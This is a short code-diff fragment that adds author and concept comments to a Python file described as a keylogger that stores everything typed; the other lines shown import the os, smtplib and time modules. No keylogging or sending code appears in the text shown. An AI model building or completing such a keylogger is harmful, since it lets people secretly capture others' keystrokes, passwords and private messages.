@@ -1,3 +1,8 @@
+#Author: memegamer138
+#Concept: Keylogger that stores all data that has been typed.
+#Link: https://github.com/memegamer138
+
+
 from os import *
 from smtplib import *
 from time import *
